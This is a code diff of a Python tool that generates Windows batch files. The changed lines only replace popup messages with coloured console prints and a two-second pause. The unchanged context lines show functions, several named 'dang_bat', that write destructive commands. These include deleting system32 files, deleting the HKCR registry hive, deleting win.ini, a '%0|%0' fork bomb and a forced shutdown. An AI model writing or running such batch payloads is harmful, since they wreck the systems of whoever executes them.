@@ -503,7 +503,8 @@ def real_python():
                             "GOTO START")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', '"Your_data"', ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def simple_bat_2():
@@ -522,7 +523,8 @@ def real_python():
                             "loop")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', '"Your_data"', ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def simple_bat_3():
@@ -546,7 +548,8 @@ def real_python():
                             "loop")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def simple_bat_4():
@@ -563,7 +566,8 @@ def real_python():
 
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def simple_bat_5():
@@ -578,7 +582,8 @@ def real_python():
                             'SHUTDOWN -C ' + '"' + user_message + '"' + ' -S')
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def simple_bat_6():
@@ -590,7 +595,8 @@ def real_python():
                     f.write(".LOG")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def simple_bat_7():
@@ -602,7 +608,8 @@ def real_python():
                     f.write("%0|%0")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def simple_bat_input():
@@ -659,7 +666,8 @@ def real_python():
                             "goto x")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def dang_bat_2():
@@ -671,7 +679,8 @@ def real_python():
                     f.write("del c:WINDOWSsystem32*.*/q")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def dang_bat_3():
@@ -688,7 +697,8 @@ def real_python():
                             "echo Disable ! PAUSE")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def dang_bat_4():
@@ -703,7 +713,8 @@ def real_python():
                             "START reg delete HKCR/*")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def dang_bat_5():
@@ -725,7 +736,8 @@ def real_python():
                     f.close()
                     f1.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def dang_bat_10():
@@ -745,7 +757,8 @@ def real_python():
                             "del c:windowswin.ini")
                     f.close()
                     contact()
-                    sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                    time.sleep(2)
                     bat()
 
                 def dang_bat_input():
@@ -1955,7 +1968,8 @@ def real_python():
                                     back_color='white')
 
                 img.save(path)
-                sg.Popup('Your File is On ', "'Your_data'", ' Folder')
+                print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
+                time.sleep(2)
                 real_python()
             else:
                 print("Internet Connection Are not Available, plz try again")
